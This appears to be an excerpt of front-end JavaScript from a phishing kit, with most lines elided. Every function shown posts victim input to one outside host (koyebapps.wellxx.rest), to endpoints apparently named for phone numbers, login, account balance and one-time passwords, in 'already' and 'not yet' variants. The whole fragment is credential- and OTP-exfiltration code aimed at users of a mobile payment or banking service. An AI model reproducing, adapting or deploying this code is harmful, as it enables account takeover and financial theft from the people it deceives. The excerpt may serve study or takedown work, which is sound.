function sendHp() {
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/12/no.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://koyebapps.wellxx.rest/12/sudah.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/12/saldosdh.php',
      type: 'POST',
...
function sendOtpS() {        
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/12/otpsdh.php',
      type: 'POST',
...
document.getElementById("nohp").value =
    ...
    $.ajax({
      url: 'https://koyebapps.wellxx.rest/12/belum.php',
      type: 'POST',
...
function sendSaldo() {
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/12/saldoblm.php',
      type: 'POST',
...
function sendOtp() {
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/12/otpblm.php',
      type: 'POST',
